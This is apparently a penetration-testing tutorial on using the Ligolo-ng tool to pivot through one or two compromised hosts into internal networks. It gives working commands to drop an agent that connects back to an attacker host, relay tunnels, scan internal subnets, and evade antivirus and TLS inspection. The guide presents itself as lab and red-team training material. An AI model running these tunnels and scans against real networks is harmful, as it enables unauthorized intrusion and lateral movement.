---
title: "Ligolo-ng: Single and Double Pivoting Guide"
date: "2026-05-07T10:00:00+05:30"
draft: false
categories: ["Tutorial", "Pentesting"]
tags: ["pivoting", "tunneling", "lateral-movement", "post-exploitation", "red-team", "ligolo-ng"]
difficulties: ["intermediate"]
tools: ["ligolo-ng", "nmap", "go"]
description: "Hands-on guide to Ligolo-ng — install, configure, and pivot through one or more compromised hosts using TUN interface tunneling instead of SOCKS proxies."
---

<div class="difficulty-badge difficulty-intermediate">Intermediate Level</div>

## 📋 Table of Contents

- [What is Ligolo-ng?](#what-is-ligolo-ng)
- [Why Not SOCKS Proxies?](#why-not-socks-proxies)
- [How Ligolo-ng Works](#how-ligolo-ng-works)
- [Installation](#installation)
- [Single Pivot Setup](#single-pivot-setup)
- [Double Pivot Setup](#double-pivot-setup)
- [Useful Commands Reference](#useful-commands-reference)
- [Troubleshooting](#troubleshooting)
- [Conclusion](#conclusion)

## What is Ligolo-ng?

Ligolo-ng is a fast, lightweight tunneling tool written in Go by **Nicolas Chatelain** ([Nicocha30](https://github.com/nicocha30/ligolo-ng)). It establishes a reverse tunnel between an attacker machine and a compromised host, then exposes the victim's internal network through a virtual TUN interface on the attacker's box.

The result: the operator's host can route traffic to internal subnets as if it were physically plugged into them — no SOCKS proxy, no `proxychains`, no protocol limitations.

<div class="callout callout-info">
<div class="callout-title">Key Components</div>

- **`proxy`** — runs on the attacker machine, listens for incoming agent connections, manages the TUN interface
- **`agent`** — dropped on the compromised host, dials back to the proxy over TLS
</div>

## Why Not SOCKS Proxies?

<span class="tool-badge">chisel</span> <span class="tool-badge">ssh -D</span> <span class="tool-badge">proxychains</span>

Traditional SOCKS-based pivoting tools have well-known pain points:

| Problem | SOCKS | Ligolo-ng |
|---------|-------|-----------|
| ICMP / ping support | ❌ No | ✅ Yes |
| UDP support | ⚠️ Limited | ✅ Native |
| Nmap SYN scans | ❌ No (TCP connect only) | ✅ Yes |
| `proxychains` overhead | ❌ Required | ✅ Not needed |
| Tool compatibility | Hit or miss | Native — every tool just works |
| Throughput | Low | High |

Because Ligolo-ng exposes the remote network as a Layer 3 interface, every networking tool on your box — `nmap`, `crackmapexec`, `impacket`, `metasploit`, browsers — works without any wrapper.

## How Ligolo-ng Works

```
┌─────────────┐         TLS Tunnel         ┌──────────────┐
│   Attacker  │ ◄────────(11601)──────────►│ Compromised  │
│   (proxy)   │                             │   (agent)    │
│             │                             │              │
│  TUN: ligolo│                             │  eth0/eth1   │
└──────┬──────┘                             └──────┬───────┘
       │                                            │
       │ ip route add 10.10.20.0/24 dev ligolo      │
       ▼                                            ▼
   Operator's tools                       Internal Network
   (nmap, crackmapexec, etc.)             (10.10.20.0/24)
```

The proxy assigns each connected agent its own TUN interface. Traffic destined for the internal subnet gets routed through the kernel into that TUN, encapsulated, sent over the TLS tunnel, and emitted from the agent on the victim host.

## Installation

### Prerequisites

- Linux box for the proxy (TUN/TAP support required)
- Root or `CAP_NET_ADMIN` capability for TUN interface creation
- Go 1.20+ if building from source (optional)

### Option 1: Download Prebuilt Binaries

Grab the latest release from the [official GitHub releases](https://github.com/nicocha30/ligolo-ng/releases):

```bash
mkdir -p ~/tools/ligolo-ng && cd ~/tools/ligolo-ng

# Proxy (attacker - Linux x64)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz
tar -xvzf ligolo-ng_proxy_linux_amd64.tar.gz

# Agent (Linux x64)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz
tar -xvzf ligolo-ng_agent_linux_amd64.tar.gz

# Agent (Windows x64) — for Windows targets
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_windows_amd64.zip
unzip ligolo-ng_agent_windows_amd64.zip
```

<!-- COPY_BUTTON -->

### Option 2: Build From Source

```bash
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng
go build -o proxy cmd/proxy/main.go
go build -o agent cmd/agent/main.go

# Cross-compile agent for Windows
GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go
```

<!-- COPY_BUTTON -->

<div class="callout callout-success">
<div class="callout-title">Tip</div>

Build agents with `-ldflags "-s -w"` to strip symbols and shrink the binary. Use UPX for further compression if AV evasion is in scope (and authorized).
</div>

## Single Pivot Setup

Scenario: you compromised `10.10.10.50` (DMZ host) which has a second NIC into `10.10.20.0/24` (internal network). The internal network is unreachable from your box directly.

### Step 1: Create the TUN Interface (Attacker)

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

<!-- COPY_BUTTON -->

<div class="callout callout-info">
<div class="callout-title">Why a TUN interface?</div>

A TUN device operates at Layer 3 (IP packets). The kernel routes packets into it as if it were a real NIC. Ligolo's proxy reads those packets, ships them through the TLS tunnel, and the agent re-injects them on the remote network.
</div>

### Step 2: Start the Proxy

```bash
./proxy -selfcert
```

<!-- COPY_BUTTON -->

`-selfcert` generates a self-signed TLS certificate on the fly — fine for engagements, but for stealth or fingerprint-resistance you should provide a real cert with `-certfile` / `-keyfile`.

By default the proxy listens on `0.0.0.0:11601`. You'll land in the interactive shell:

```
ligolo-ng »
```

### Step 3: Drop and Run the Agent (Victim)

Transfer the agent binary to `10.10.10.50` (SCP, HTTP server, SMB — whatever fits). Then execute it pointing back to your proxy:

```bash
# Linux victim
./agent -connect <ATTACKER_IP>:11601 -ignore-cert

# Windows victim (PowerShell)
.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```

<!-- COPY_BUTTON -->

<div class="callout callout-warning">
<div class="callout-title">Operational Note</div>

`-ignore-cert` skips TLS verification — required when using `-selfcert` on the proxy. In a real engagement, pin a proper certificate to avoid leaking traffic patterns to defenders running TLS interception.
</div>

Back on the proxy you'll see:

```
INFO[0042] Agent joined.    name=user@DMZ-WEB01 remote="10.10.10.50:54321"
```

### Step 4: Select Session and Start Tunnel

```
ligolo-ng » session
? Specify a session : 1 - user@DMZ-WEB01 - 10.10.10.50:54321
[Agent : user@DMZ-WEB01] » ifconfig
```

`ifconfig` enumerates the agent's network interfaces — note the internal subnet you want to reach.

```
[Agent : user@DMZ-WEB01] » start
[Agent : user@DMZ-WEB01] » INFO[0103] Starting tunnel to user@DMZ-WEB01
```

<div class="callout callout-info">
<div class="callout-title">Newer versions (v0.7+)</div>

Recent releases use `tunnel_start --tun ligolo` instead of `start`. Run `help` inside the prompt to confirm the syntax for your version.
</div>

### Step 5: Route Internal Subnet Through the Tunnel

In a **separate terminal** on the attacker (the proxy shell stays interactive):

```bash
sudo ip route add 10.10.20.0/24 dev ligolo
```

<!-- COPY_BUTTON -->

That's it. You're now Layer 3-adjacent to the entire `10.10.20.0/24` subnet.

### Step 6: Verify and Pivot

```bash
# ICMP works now (would fail with SOCKS)
ping 10.10.20.10

# Full SYN scan, no proxychains
sudo nmap -sS -sV -T4 10.10.20.0/24

# Reach internal SMB
crackmapexec smb 10.10.20.0/24
```

<!-- COPY_BUTTON -->

<div class="callout callout-success">
<div class="callout-title">What just happened</div>

Your `nmap` SYN packets entered the kernel → matched the route → were emitted on the `ligolo` TUN → encrypted by the proxy → tunneled to the agent → emitted onto the victim's internal NIC → responses came back the same way. All transparent to the tool.
</div>

## Double Pivot Setup

Scenario: from the DMZ host (`10.10.10.50`), you reached `10.10.20.10` and compromised it. That second host has yet another NIC into a deeper restricted segment `10.10.30.0/24` you can't touch from your box even through the first pivot.

```
You ──► DMZ (10.10.10.50) ──► Internal (10.10.20.10) ──► Restricted (10.10.30.0/24)
        Agent #1                Agent #2                  Target
```

The trick: have the second agent connect through the first one. Ligolo-ng's `listener_add` builds a relay on the first compromised host that forwards inbound connections back to your proxy through the existing tunnel.

### Step 1: Create a Listener on the First Pivot

In the proxy shell, while inside the first agent's session:

```
[Agent : user@DMZ-WEB01] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
INFO[0220] Listener created on remote agent!
```

This tells agent #1: *"open port 11601 on yourself; forward anything that hits it back to my proxy on 127.0.0.1:11601 through our tunnel."*

<div class="callout callout-warning">
<div class="callout-title">Firewall Reality Check</div>

The listener only works if the first compromised host is reachable on port 11601 from the deeper network. If host-based firewalls block it, pick a port likely to be open egress (`443`, `8080`) or use `listener_add --addr 0.0.0.0:443 --to 127.0.0.1:11601 --tcp`.
</div>

### Step 2: Drop and Run Agent #2

Transfer the same agent binary to `10.10.20.10`. Now point it at the **first pivot's IP** instead of the attacker's:

```bash
./agent -connect 10.10.20.10:11601 -ignore-cert
```

Wait — that's wrong from agent #2's perspective. It connects to `10.10.20.10` which is itself. Use the first pivot's *internal* IP that agent #2 can reach. If agent #2 was dropped on `10.10.20.10` and the first pivot is `10.10.20.5` (the inside NIC of agent #1's host):

```bash
./agent -connect 10.10.20.5:11601 -ignore-cert
```

<!-- COPY_BUTTON -->

The connection flows: **agent #2 → first pivot's listener → tunnel #1 → your proxy**. From the proxy's view, a brand new agent just joined.

### Step 3: Start the Second Tunnel on a Fresh TUN

Create a *separate* TUN interface so traffic for the deeper subnet doesn't collide with the first one:

```bash
sudo ip tuntap add user $USER mode tun ligolo2
sudo ip link set ligolo2 up
```

<!-- COPY_BUTTON -->

In the proxy shell, switch to the new session and start its tunnel on the new interface:

```
ligolo-ng » session
? Specify a session : 2 - user@INT-APP02 - <relayed>
[Agent : user@INT-APP02] » tunnel_start --tun ligolo2
```

<div class="callout callout-info">
<div class="callout-title">Older Ligolo-ng?</div>

Versions before v0.7 only supported one TUN. Upgrade — the multi-tunnel feature is exactly what makes double pivoting clean.
</div>

### Step 4: Route the Deep Subnet

```bash
sudo ip route add 10.10.30.0/24 dev ligolo2
```

<!-- COPY_BUTTON -->

### Step 5: Verify End-to-End

```bash
ping 10.10.30.50
nmap -sS -sV --top-ports 100 10.10.30.0/24
```

<!-- COPY_BUTTON -->

You're now reaching a network that's **two compromised hosts deep**, with full L3 access, no SOCKS, no proxychains. The same pattern extends to triple, quadruple pivots — just stack listeners and TUN interfaces.

<div class="callout callout-danger">
<div class="callout-title">Authorization Reminder</div>

Pivoting tools are dual-use. Only deploy Ligolo-ng inside the scope of an authorized engagement (CTF lab, pentest contract, internal red team mandate). Pivoting into networks you don't have written permission to access is a federal crime in most jurisdictions.
</div>

## Useful Commands Reference

### Proxy Interactive Shell

| Command | What it does |
|---------|--------------|
| `session` | Switch between connected agents |
| `ifconfig` | List network interfaces on the selected agent |
| `start` / `tunnel_start --tun <name>` | Begin tunneling traffic |
| `stop` / `tunnel_stop` | Stop the current tunnel |
| `listener_add --addr <ip:port> --to <ip:port> --tcp` | Create relay listener on agent |
| `listener_list` | Show active listeners |
| `listener_del --id <n>` | Remove a listener |
| `autoroute` | (newer versions) Auto-add routes for agent's interfaces |
| `help` | Show all commands for your version |

### Agent Flags

| Flag | Purpose |
|------|---------|
| `-connect <host:port>` | Proxy address to dial |
| `-ignore-cert` | Skip TLS verification (use with `-selfcert`) |
| `-retry` | Reconnect on disconnect |
| `-bind <addr>` | Bind mode — agent listens, proxy connects (for inbound-only victims) |
| `-socks5 <ip:port>` | Route the agent's tunnel through a SOCKS5 proxy |

## Troubleshooting

<div class="callout callout-warning">
<div class="callout-title">"Operation not permitted" creating TUN</div>

You need root or `CAP_NET_ADMIN`. Use `sudo` for `ip tuntap add` / `ip link set` / `ip route add` commands. The proxy itself can run unprivileged once the TUN exists and is owned by your user.
</div>

<div class="callout callout-warning">
<div class="callout-title">Agent connects but no sessions show up</div>

Check the proxy log — TLS errors usually mean cert mismatch. With `-selfcert` on the proxy, the agent **must** use `-ignore-cert`. Otherwise pin a real cert with `-certfile`/`-keyfile` on both sides.
</div>

<div class="callout callout-warning">
<div class="callout-title">Tunnel started, but pings fail</div>

90% of the time: missing or wrong route. Verify with `ip route` that your target subnet points at the `ligolo` interface. Don't forget to bring the interface up (`ip link set ligolo up`).
</div>

<div class="callout callout-warning">
<div class="callout-title">Slow throughput on long pivots</div>

Each hop adds latency and CPU overhead (encrypt/decrypt twice for double pivot). For heavy data exfil, prefer SMB/HTTP exfil over the tunnel rather than rsync, which chats badly over high-latency links.
</div>

## Conclusion

Ligolo-ng replaces fragile SOCKS-based pivoting with proper L3 tunneling, making every standard tool work natively against deep internal networks. The two-binary design (proxy + agent), TLS transport, and multi-tunnel support make it one of the cleanest pivoting tools available for red team and OSCP-style engagements.

### Key Takeaways

1. **TUN over SOCKS** — full L3 means ICMP, UDP, SYN scans, and any tool just work
2. **Single pivot** = TUN interface + agent + route. Three commands and you're in.
3. **Double pivot** = `listener_add` on the first agent, second agent dials the listener, fresh TUN for the new subnet
4. **Multi-tunnel support (v0.7+)** is what makes nested pivots clean — upgrade if you're stuck on older releases
5. **Authorization first** — these techniques are felonies outside an explicit engagement scope

### Further Reading

- [Ligolo-ng GitHub](https://github.com/nicocha30/ligolo-ng)
- [Ligolo-ng release notes](https://github.com/nicocha30/ligolo-ng/releases)
- [Linux TUN/TAP documentation](https://www.kernel.org/doc/Documentation/networking/tuntap.txt)
